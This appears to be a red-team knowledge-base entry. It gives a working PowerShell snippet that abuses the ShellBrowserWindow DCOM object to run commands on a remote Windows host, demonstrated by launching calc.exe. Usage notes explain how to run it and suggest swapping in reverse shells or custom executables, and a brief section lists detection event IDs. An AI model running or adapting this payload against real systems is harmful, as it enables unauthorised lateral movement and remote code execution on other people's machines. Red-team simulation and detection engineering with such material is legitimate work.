---
id: dc022d7e-d739-45de-b1fb-31ee06fb8806
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:07.185796+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - dcom
  - lateral-movement
  - remote-execution
  - payload
validated: true
---

# PowerShell DCOM ShellBrowserWindow Calculator Payload

## Code

```powershell
$com = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880',"$TARGET_IP")
$obj = [System.Activator]::CreateInstance($com)
$obj.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)
```

## Description

This PowerShell code snippet exploits the ShellBrowserWindow DCOM object to remotely execute the Windows Calculator (calc.exe) on a target machine. It serves as a proof-of-concept payload for lateral movement in Active Directory environments, demonstrating remote code execution without needing admin rights on the target. The code can be modified to run arbitrary commands by changing the ShellExecute arguments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET_IP | IP address or hostname of the remote target machine | 10.10.10.1 |

## Usage

Execute this code from a domain-joined Windows machine with user credentials valid on the target. Save as a .ps1 file and run with PowerShell (e.g., powershell.exe -File payload.ps1), or embed in a larger script. It requires network access to the target's DCOM ports. Use for red team exercises to simulate lateral movement; adapt for more complex payloads like reverse shells by replacing calc.exe with a custom executable.

## Detection

- Monitor PowerShell ScriptBlock logging for CLSID references or Activator::CreateInstance calls (Event ID 4104).
- DCOM activation logs in Event Viewer (Microsoft-Windows-DCOM/Operational, Event ID 10000) showing ShellWindows object instantiation.
- Network traffic: Unusual RPC/DCOM over TCP 135 and high ports from attacker to target.
- Process creation: cmd.exe spawning calc.exe without local parent (use Sysmon Event ID 1).

## Related

- [[procedures/dcom-shellbrowserwindow-calculator-execution]]
- [[commands/powershell-dcom-shellbrowserwindow-execute-calculator]]
